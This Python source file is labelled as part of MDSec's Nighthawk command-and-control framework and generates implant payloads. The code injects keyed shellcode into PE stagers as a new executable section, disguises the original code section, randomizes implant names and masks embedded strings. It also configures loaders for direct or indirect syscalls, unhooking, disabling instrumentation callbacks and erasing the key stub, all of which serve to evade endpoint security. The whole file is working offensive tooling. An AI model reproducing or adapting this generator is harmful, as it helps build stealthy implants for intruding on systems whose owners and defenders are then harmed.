# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import os
import subprocess
import agent_config
import embed_profile
from gen_shellcode import ShellcodeGenerator
from gen_keying_shellcode import KeyedShellcodeGenerator, EPayloadKeyingStrategy

from datetime import datetime
from base64 import b64decode
from random import shuffle, choice
import string, struct

import pefile

MASK_PREFIX = "MASK-PREFIX-"

REPLACE_STRINGS_STATIC = [
	"Implant.x64.dll",
	"Implant.x86.dll",
	"Implant.Rundll32.x86.dll",
	"Implant.Rundll32.x64.dll",
	"Implant.x86.raw-artifact",
	"Implant.x64.raw-artifact"
]

REFLECTIVE_LOADER_EXPORT_NAMES = [b"_REFLECTIVELOADERDLLEXPORTNAMEXXX@0", b"REFLECTIVELOADERDLLEXPORTNAMEXXX"]
ORDINARY_LOADER_EXPORT_NAMES = [b"_ORDINARYLOADERDLLEXPORTNAMEXXXXX@0", b"ORDINARYLOADERDLLEXPORTNAMEXXXXX"]

class EReflectiveLoaderMode(object):
	WinAPI = 0
	NativeAPI = 1
	Syscalls = 2
	Threadpool = 3

class EReflectiveLoaderLoadLibMode(object):
	Win32LoadLibrary = 0
	ThreadPoolLoadLibrary = 1
	DarkLoad = 2

class EReflectiveLoaderGetProcMode(object):
	Win32GetProcAddress = 0
	LdrGetProcedureAddress = 1
	ThreadpoolLdrGPA = 2

class EReflectiveLoaderOpsecExtras(object):
	DisablePICallback = 1
	IndirectSyscalls = 2
	UnhookCommon = 4
	AvoidHeapAlloc = 8
	UnhookClearGuard = 16

def align_up(value, align = 0x1000): return (value + align - 1) & -align

def add_shellcode_to_stager(shellcode, template_bin, outtype):
	# read the shellcode
	shellcode_len = len(shellcode)
	
	#	 
	# parse PE file
	#
	pe = pefile.PE(data=template_bin)

	#
	# Generate a random name for section. Better to use something whitelisted, but not already part of the sections.
	#
	letters = string.ascii_lowercase
	IMAGE_SIZEOF_SHORT_NAME = 8
	section_name = "." + ''.join(choice(letters) for i in range(IMAGE_SIZEOF_SHORT_NAME - 1))

	#
	# Find the .text section and rename it. Remove executable attributes.
	#
	for section in pe.sections:
		Name = section.Name.decode().rstrip('\x00')
		if  Name == ".text":
			section.Name = section_name.encode()
			section.Characteristics ^= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']
			section.Characteristics ^= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']
			break;
			
	# read the section headers
	section_header_size = pefile.Structure(pefile.PE.__IMAGE_SECTION_HEADER_format__).sizeof()
	section_header_off = pe.sections[-1].get_file_offset() + section_header_size
	
	if section_header_off + section_header_size > pe.OPTIONAL_HEADER.SizeOfHeaders:
		raise Exception('[!] Not enough room for another SECTION_HEADER')

	# align the input data up by section alignment amount.
	virtual_size = align_up(shellcode_len, pe.OPTIONAL_HEADER.SectionAlignment)
	
	virtual_addr = align_up(
		pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize,
		pe.OPTIONAL_HEADER.SectionAlignment
	)

	raw_size = align_up(shellcode_len, pe.OPTIONAL_HEADER.FileAlignment)
	
	raw_ptr = align_up(
		pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData,
		pe.OPTIONAL_HEADER.FileAlignment
	)

	#
	# create a new section for the shellcode
	#
	section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
	section.set_file_offset(section_header_off)
	section.Name = ".text".encode().ljust(IMAGE_SIZEOF_SHORT_NAME, b'\x00')
	section.VirtualAddress = virtual_addr
	section.PointerToRawData = raw_ptr
	section.Misc = section.Misc_VirtualSize = virtual_size
	section.SizeOfRawData = raw_size
	# set to executable
	section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE'] 
	section.Characteristics |= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE'] 
	section.Characteristics |= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ']
	section.Characteristics |= pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE']

	section.PointerToRelocations = 0
	section.NumberOfRelocations = 0
	section.NumberOfLinenumbers = 0
	section.PointerToLinenumbers = 0

	pe.FILE_HEADER.NumberOfSections += 1

	#
	# Update the SizeOfImage, BaseOfCode and SizeOfCode
	#
	pe.OPTIONAL_HEADER.SizeOfImage = virtual_addr + virtual_size
	pe.OPTIONAL_HEADER.BaseOfCode = virtual_addr
	pe.OPTIONAL_HEADER.SizeOfCode = shellcode_len
	
	#
	# Update the entrypoint for RDLL, XLL and CPL.
	#
	if outtype == "rdll" or outtype == "dll":
		#
		# Set entrypoint to zero.
		#
		pe.OPTIONAL_HEADER.AddressOfEntryPoint = 0
		
		exp = pe.OPTIONAL_HEADER.DATA_DIRECTORY[0]
		
		if exp.VirtualAddress == 0:
			raise Exception("Invalid RDLL. No exports found!")

		eat = pe.parse_export_directory(exp.VirtualAddress, exp.Size)

		rva = 0

		#
		# Find the first exported symbol and update address
		#
		for sym in eat.symbols:
			# skip import by ordinal entries
			if sym.name is None:
				continue
			sym.address = virtual_addr
			break
	else:
		pe.OPTIONAL_HEADER.AddressOfEntryPoint = virtual_addr
	
	#
	# Set the subsystem.
	#
	if outtype == "exe":
		pe.OPTIONAL_HEADER.Subsystem = pefile.SUBSYSTEM_TYPE['IMAGE_SUBSYSTEM_WINDOWS_GUI']
	
	#
	# Add shellcode to the end of file and pad remaining space with zeros.
	#
	pe.__data__ += shellcode + (b'\x00' * (raw_size - shellcode_len))
	pe.__structures__.append(section)

	#
	# Update the checksum.
	#
	pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
	
	return str(pe.write())

class PayloadGenerator(object):
	ASSETS_FOLDER = "assets"

	@staticmethod
	def __subChars(xlat_table, s):
		newstr = []
		for c in s:
			index = xlat_table[0].find(c)
			if index != -1:
				newstr.append(xlat_table[1][index])
			else:
				newstr.append(c)
		return "".join(newstr)

	@staticmethod
	def __replace_masked_strings(payload, xlat_table):
		
		while True:
			index = payload.find(MASK_PREFIX)
			if index == -1:
				break

			end_pos = None

			for i in xrange(index, len(payload)):
				if payload[i] == '\x00':
					end_pos = i
					break

			if not end_pos:
				break

			cleartext = payload[index + len(MASK_PREFIX):end_pos]
			encodedtext = PayloadGenerator.__subChars(xlat_table, cleartext)

			payload = payload[:index] + encodedtext + ("\x00" * len(MASK_PREFIX)) + payload[end_pos:]
		
		return payload

	@staticmethod
	def __replace_static_strings(payload):
		for replace_str in REPLACE_STRINGS_STATIC:
			rand_str = "".join([choice(string.ascii_letters) for i in xrange(len(replace_str))])
			payload = payload.replace(replace_str, rand_str)

		return payload

	@staticmethod
	def create_xlat_table():
		xlat_dict = "Wc2*C{]dVh:0atO>8PZ+}i4A-g)BLv E.^[jxXwbIQ,s$yJR3&H/u9pG6qDS_=!7TYmFnKz<rfkUMe1(l?No5;"
		xlat_from = [c for c in xlat_dict]
		shuffle(xlat_from)
		xlat_to = [c for c in xlat_dict]
		shuffle(xlat_to)
		xlat_table = ["".join(xlat_from), "".join(xlat_to)]
		return xlat_table

	@staticmethod
	def create_from_agentprofile(listener_name, config, payload_params):
		payload_type = payload_params["payload_type"]
		agent_type = payload_params["agent_type"]
		keying_info = payload_params["keying_info"]
		
		# [windows]-[x86|x64]-[shellcode|exe|rdll|dll]-[staged|]
		os_ver,arch,type = payload_type.split("-", 3)
		is_staged = False
		
		if not os_ver or not arch or not type:
			raise Exception("Requires os_ver, arch and payload type to be specified")

		if os_ver != "windows":
			raise Exception("Only supports os_ver=windows at present")

		if arch not in ["x86", "x64"]:
			raise Exception("Only supports x86 and x64 arch at present")
		
		if type.endswith("-staged"):
			type = type[:-7]
			is_staged = True

		if type not in ["shellcode", "exe", "rdll", "dll"]:
			raise Exception("Only supports exe, rdll, and dll payloads at present")

		raw_artifact_path = os.path.join(os.getcwd(), "%s/%s.%s.raw-artifact" % (PayloadGenerator.ASSETS_FOLDER, "Implant", arch))
		
		if not os.path.exists(raw_artifact_path):
			raise Exception("Asset %s does not exist" % raw_artifact_path)

		raw_artifact_dll_bytes = None

		with open(raw_artifact_path, "rb") as f:
			raw_artifact_dll_bytes = f.read()

		template_artifact_dll_bytes = None

		if type != "shellcode":
			template_artifact_path = os.path.join(os.getcwd(), "%s/%s.%s.%s" % (PayloadGenerator.ASSETS_FOLDER, "Implant", arch, type))
		
			if not os.path.exists(template_artifact_path):
				raise Exception("Asset %s does not exist" % template_artifact_path)

			with open(template_artifact_path, "rb") as f:
				template_artifact_dll_bytes = f.read()

		payload_key = str(b64decode(keying_info["payload_key"]))
		keying_strategy = keying_info["keying_strategy"]
		keying_params = keying_info["keying_params"]

		loader_export = "ReflectiveLoader"

		try:
			loader_export = str(config["implant-config"]["general-config"]["opsec"]["loader-export"])
		except KeyError:
			pass

		ordinary_export = "CPlApplet"

		try:
			ordinary_export = str(config["implant-config"]["general-config"]["opsec"]["ordinary-export"])
		except KeyError:
			pass

		ldr_strategy = EReflectiveLoaderMode.NativeAPI
		ldr_ll_mode = EReflectiveLoaderLoadLibMode.Win32LoadLibrary
		ldr_gpa_mode = EReflectiveLoaderGetProcMode.LdrGetProcedureAddress
		ldr_disable_pi = False
		ldr_indirect_syscalls = False
		ldr_unhook = False
		ldr_unhook_clear_guard = False
		ldr_avoid_heapalloc = False
		ldr_erase_keystub = False

		try:
			ldr_strategies = {
				"winapi": EReflectiveLoaderMode.WinAPI,
				"native": EReflectiveLoaderMode.NativeAPI,
				"syscalls": EReflectiveLoaderMode.Syscalls,
				"threadpool": EReflectiveLoaderMode.Threadpool
			}

			ldr_ll_modes = {
					"winapi": EReflectiveLoaderLoadLibMode.Win32LoadLibrary,
					"threadpool": EReflectiveLoaderLoadLibMode.ThreadPoolLoadLibrary,
					"darkload": EReflectiveLoaderLoadLibMode.DarkLoad
				}
			
			ldr_gpa_modes = {
					"winapi": EReflectiveLoaderGetProcMode.Win32GetProcAddress,
					"native": EReflectiveLoaderGetProcMode.LdrGetProcedureAddress,
					"threadpool": EReflectiveLoaderGetProcMode.ThreadpoolLdrGPA,
				}

			ldr_strategy = ldr_strategies[str(config["implant-config"]["general-config"]["opsec"]["loader-strategy"])]
			ldr_ll_mode = ldr_ll_modes[str(config["implant-config"]["general-config"]["opsec"]["loader-loadlib"])]
			ldr_gpa_mode = ldr_gpa_modes[str(config["implant-config"]["general-config"]["opsec"]["loader-getproc"])]
			ldr_disable_pi = config["implant-config"]["general-config"]["opsec"]["loader-disable-pi-callback"]
			ldr_indirect_syscalls = config["implant-config"]["general-config"]["opsec"]["loader-indirect-syscalls"]
			ldr_unhook = config["implant-config"]["general-config"]["opsec"]["loader-unhook"]
			ldr_unhook_clear_guard = config["implant-config"]["general-config"]["opsec"]["loader-unhook-clear-guard"]
			ldr_avoid_heapalloc = config["implant-config"]["general-config"]["opsec"]["loader-avoid-heapalloc"]
			ldr_erase_keystub = config["implant-config"]["general-config"]["opsec"]["loader-erase-keystub"]
		except KeyError:
			pass
		
		ldr_opts_extra = 0

		if ldr_disable_pi:
			ldr_opts_extra |= EReflectiveLoaderOpsecExtras.DisablePICallback

		if ldr_indirect_syscalls:
			ldr_opts_extra |= EReflectiveLoaderOpsecExtras.IndirectSyscalls
		
		if ldr_unhook:
			ldr_opts_extra |= EReflectiveLoaderOpsecExtras.UnhookCommon
		
		if ldr_unhook_clear_guard:
			ldr_opts_extra |= EReflectiveLoaderOpsecExtras.UnhookClearGuard
		
		if ldr_avoid_heapalloc:
			ldr_opts_extra |= EReflectiveLoaderOpsecExtras.AvoidHeapAlloc
		
		keying_params["loader-strategy"] = "syscalls" if ldr_strategy == EReflectiveLoaderMode.Syscalls else ""
		keying_params["loader-loadlib"] = "threadpool" if ldr_ll_mode == EReflectiveLoaderLoadLibMode.ThreadPoolLoadLibrary else ""
		keying_params["loader-disable-pi-callback"] = str(ldr_disable_pi)
		keying_params["loader-indirect-syscalls"] = str(ldr_indirect_syscalls)
		keying_params["loader-unhook"] = str(ldr_unhook)
		keying_params["loader-unhook-clear-guard"] = str(ldr_unhook_clear_guard)
		keying_params["loader-avoid-heapalloc"] = str(ldr_avoid_heapalloc)

		xlat_table = PayloadGenerator.create_xlat_table()
		
		config = agent_config.xlatJSON(xlat_table, config)
		
		raw_artifact_payload = embed_profile.embed_profile(
				raw_artifact_dll_bytes, config,
				{
					"loader-strategy": ldr_strategy,
					"loader-loadlib": ldr_ll_mode,
					"loader-getproc": ldr_gpa_mode,
					"loader-opts-extra": ldr_opts_extra,
					"loader-erase-keystub": ldr_erase_keystub
				},
				True if keying_strategy != EPayloadKeyingStrategy.NONE else False
			)

		raw_artifact_payload = raw_artifact_payload.replace("Wc2*C{]dVh:0atO>8PZ+}i4A-g)BLv E.^[jxXwbIQ,s$yJR3&H/u9pG6qDS_=!7TYmFnKz<rfkUMe1(l?No5;", xlat_table[0])
		raw_artifact_payload = raw_artifact_payload.replace("}H04;r:-mPA68a(G_.Q^&qe{*MfKu]pFIjwc7ObnxTZoXDRt<?k3y2WN$ 1hUg,!zBLSJ95C=YE[s)ld/i>vV+", xlat_table[1])

		raw_artifact_payload = PayloadGenerator.__replace_masked_strings(raw_artifact_payload, xlat_table)
		raw_artifact_payload = PayloadGenerator.__replace_static_strings(raw_artifact_payload)
		
		raw_artifact_payload = ShellcodeGenerator.convert_rdll_to_uncompressed_shellcode(raw_artifact_payload, loader_export)

		keyed_payload = KeyedShellcodeGenerator.convert_shellcode_to_keyed_shellcode(raw_artifact_payload, arch == "x64", payload_key, keying_strategy, keying_params)

		if type != "shellcode":
			keyed_payload = add_shellcode_to_stager(keyed_payload, template_artifact_dll_bytes, type)
			
			for REFLECTIVE_LOADER_EXPORT_NAME in REFLECTIVE_LOADER_EXPORT_NAMES:
				if REFLECTIVE_LOADER_EXPORT_NAME in keyed_payload:
					loader_export = loader_export[:len(REFLECTIVE_LOADER_EXPORT_NAME)]
					loader_export += ('\x00' * (len(REFLECTIVE_LOADER_EXPORT_NAME) - len(loader_export)))
					keyed_payload = keyed_payload.replace(REFLECTIVE_LOADER_EXPORT_NAME, loader_export)

			for ORDINARY_LOADER_EXPORT_NAME in ORDINARY_LOADER_EXPORT_NAMES:
				if ORDINARY_LOADER_EXPORT_NAME in keyed_payload:
					ordinary_export = ordinary_export[:len(ORDINARY_LOADER_EXPORT_NAME)]
					ordinary_export += ('\x00' * (len(ORDINARY_LOADER_EXPORT_NAME) - len(ordinary_export)))
					keyed_payload = keyed_payload.replace(ORDINARY_LOADER_EXPORT_NAME, ordinary_export)

		return keyed_payload,("%s-%s-%s" % (listener_name, agent_type, payload_type))
	
	@staticmethod
	def create(deployed_inst, payload_params):
		#deployed_inst is a DeployedC2Instance
		#deployed_inst.Profile contains full C2 profile
		
		uri = payload_params["uri"]
		proxy_uri = payload_params["proxy_uri"]
		agent_type = payload_params["agent_type"]

		if agent_type not in ["egress", "p2p"]:
			raise Exception("Only supports egress or p2p agent_type at present")

		config = agent_config.create(deployed_inst.Profile, agent_type, uri, proxy_uri)
		return PayloadGenerator.create_from_agentprofile(deployed_inst.ListenerName, config, payload_params)